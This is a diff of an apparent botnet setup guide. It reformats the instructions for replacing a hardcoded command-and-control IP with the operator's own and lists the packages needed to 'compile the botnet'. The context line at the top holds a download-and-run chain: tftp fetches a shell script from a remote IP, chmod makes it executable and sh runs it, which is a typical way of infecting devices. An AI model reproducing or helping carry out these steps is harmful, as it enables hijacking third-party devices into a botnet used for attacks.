@@ -30,13 +30,14 @@ tftp -r tftp1.sh -g 94.177.230.28; chmod 777 tftp1.sh; sh tftp1.sh; ftpget -v -u
 )))))))))))
 
 EDIT THE IP 
- LINE 224     ===   94.177.230.28:812  (change to)  "your ip":23
+ LINE 224     ===   94.177.230.28:812  (change to)  {{  "your ip":23    }}
  
  MAKE SURE WHEN YOU EDIT THE IP'S CORRECT on one of the lines theres a IP thats looks LIKE 94.177.230.2
  (make sure to take off one of the numbers ) to the ip
  
  example (IP) 192.168.1.72
- if 94.177.230.28 make it look like 192.168.1.72     ------- if the ip looks like 94.177.230.2   make it look like 192.168.1.72
+ if 94.177.230.28 make it look like 192.168.1.72     
+ if the ip looks like 94.177.230.2   make it look like 192.168.1.72
  
  after you have done all of that
  
@@ -45,17 +46,39 @@ EDIT THE IP
  (COMPILE THE BOTNET)
  THE PACKAGES YOU WILL NEED
  
- sudo apt-get install yum               (MIGHT UPDATE)
- sudo apt-get install python3           (JUST DO IT IT MIGHT HAVE A NEW VERSION)
- sudo apt-get install python-paramiko   (JUST DO IT IT MIGHT HAVE A NEW VERSION)
- sudo apt-get install nano              (JUST DO IT IT MIGHT HAVE A NEW VERSION
- sudo apt-get install screen            (MOST OF LINUX OS's SO NOT HAVE SCREEN INSTALLED)
- sudo apt-get install gcc               (JUST DO IT IT MIGHT HAVE A NEW VERSION)
- sudo apt-get install perl              (NEW VERSIONS OF PERL GET REALESED MONTHLY/WEEKLY)
- sudo apt-get install wget              (JUST DO IT IT MIGHT HAVE A NEW VERSION)
- sudo apt-get install zip               (BOLTH ARE NEEDED FOR THE DOWNLOAD)
- sudo apt-get install zip2              (BOLTH ARE NEEDED FOR THE DOWNLOAD)
- sudo apt-get install unzip             (JUST DO IT IT MIGHT HAVE A NEW VERSION)
+ sudo apt-get install yum               
+ (MIGHT UPDATE)
+ 
+ sudo apt-get install python3           
+ (JUST DO IT IT MIGHT HAVE A NEW VERSION)
+ 
+ sudo apt-get install python-paramiko   
+ (JUST DO IT IT MIGHT HAVE A NEW VERSION)
+ 
+ sudo apt-get install nano              
+ (JUST DO IT IT MIGHT HAVE A NEW VERSION
+ 
+ sudo apt-get install screen            
+ (MOST OF LINUX OS's SO NOT HAVE SCREEN INSTALLED)
+ 
+ sudo apt-get install gcc               
+ (JUST DO IT IT MIGHT HAVE A NEW VERSION)
+ 
+ sudo apt-get install perl              
+ (NEW VERSIONS OF PERL GET REALESED MONTHLY/WEEKLY)
+ 
+ sudo apt-get install wget              
+ (JUST DO IT IT MIGHT HAVE A NEW VERSION)
+ 
+ sudo apt-get install zip               
+ (BOLTH ARE NEEDED FOR THE DOWNLOAD)
+ 
+ sudo apt-get install zip2             
+ (BOLTH ARE NEEDED FOR THE DOWNLOAD)
+ 
+ sudo apt-get install unzip            
+ (JUST DO IT IT MIGHT HAVE A NEW VERSION)
+ 
  THOSE ARE ALL THE PACKAGES YOU NEED AFTER THAT I DO RECOMEND DOING
  sudo apt-get update     (DO THIS)
  sudo apt-get upgrade
